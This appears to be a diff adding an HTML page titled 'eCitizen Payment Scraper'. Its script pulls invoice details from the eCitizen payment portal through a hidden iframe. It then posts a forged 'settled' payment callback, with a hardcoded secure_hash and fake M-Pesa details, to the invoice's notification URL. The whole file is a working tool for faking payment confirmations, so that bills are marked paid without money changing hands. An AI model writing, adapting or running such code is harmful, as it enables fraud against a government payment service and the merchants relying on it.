@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eCitizen Payment Scraper</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        #loader { display: none; }
+        .hidden { display: none; }
+        .alert-box { margin-top: 20px; }
+    </style>
+</head>
+<body class="bg-light">
+    <div class="container py-5">
+        <h2 class="mb-4 text-center">eCitizen Airtel Payment Scraper</h2>
+        <form id="codeForm" class="mb-4">
+            <div class="input-group">
+                <input type="text" class="form-control" id="codeInput" placeholder="Enter Code Number" required>
+                <button class="btn btn-primary" type="submit">Fetch Invoice</button>
+            </div>
+        </form>
+
+        <div id="loader" class="text-center mb-4">
+            <div class="spinner-border text-primary" role="status">
+                <span class="visually-hidden">Loading...</span>
+            </div>
+        </div>
+
+        <form id="formA" class="hidden">
+            <h5 class="mb-3">Form A - Airtel Payment Details</h5>
+            <input type="hidden" name="notification_url">
+            <input type="hidden" name="amount">
+            <input type="hidden" name="bill_ref">
+            <input type="hidden" name="invoice_no">
+            <button type="submit" class="btn btn-success">Submit Notification</button>
+        </form>
+
+        <div id="result" class="alert-box"></div>
+    </div>
+
+    <script>
+        document.getElementById('codeForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const code = document.getElementById('codeInput').value;
+            const url = `https://payments.ecitizen.go.ke/api/invoice/checkout/${code}?callback_url=https://bomayangu.go.ke/payments#`;
+
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('formA').classList.add('hidden');
+            document.getElementById('result').innerHTML = '';
+
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            iframe.src = url;
+
+            iframe.onload = function () {
+                try {
+                    const airtel = iframe.contentDocument.querySelector('airtel-v3');
+                    if (!airtel) throw new Error('Element not found');
+
+                    document.querySelector('#formA [name=amount]').value = airtel.getAttribute('amount_net');
+                    document.querySelector('#formA [name=bill_ref]').value = airtel.getAttribute('bill_ref');
+                    document.querySelector('#formA [name=invoice_no]').value = airtel.getAttribute('invoice_no');
+                    document.querySelector('#formA [name=notification_url]').value = airtel.getAttribute('notification_url');
+
+                    document.getElementById('formA').classList.remove('hidden');
+                } catch (err) {
+                    document.getElementById('result').innerHTML = `<div class="alert alert-danger">Failed to extract data. Check if code is correct.</div>`;
+                } finally {
+                    document.getElementById('loader').style.display = 'none';
+                    document.body.removeChild(iframe);
+                }
+            };
+        });
+
+        document.getElementById('formA').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const form = e.target;
+            const notification_url = form.notification_url.value;
+            const amount = form.amount.value;
+            const bill_ref = form.bill_ref.value;
+
+            const payload = {
+                status: "settled",
+                secure_hash: "MzA5YzdkODFmZTdiM2E2MmU0NDJjNzZkN2IxOTAxMzkxZjUzNTgyNTU0NjE1MDE3Y2FjNDVkYmUyNDE5ZTJjNA==",
+                phone_number: "254700000000",
+                payment_reference: [
+                    {
+                        payment_reference: "",
+                        payment_date: new Date().toISOString(),
+                        inserted_at: new Date().toISOString(),
+                        currency: "KES",
+                        amount: amount
+                    }
+                ],
+                payment_date: new Date().toISOString(),
+                payment_channel: "MPESA",
+                last_payment_amount: "0",
+                invoice_number: bill_ref,
+                invoice_amount: amount + ".00",
+                currency: "KES",
+                client_invoice_ref: bill_ref,
+                amount_paid: amount
+            };
+
+            try {
+                const res = await fetch(notification_url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const text = await res.text();
+                const resultBox = document.getElementById('result');
+                resultBox.innerHTML = `<div class="alert ${res.status === 200 ? 'alert-success' : 'alert-danger'}">
+                    <strong>${res.status === 200 ? 'Success' : 'Failure'}:</strong> ${text}
+                </div>`;
+            } catch (err) {
+                document.getElementById('result').innerHTML = `<div class="alert alert-danger">Error: ${err.message}</div>`;
+            }
+        });
+    </script>
+</body>
+</html>
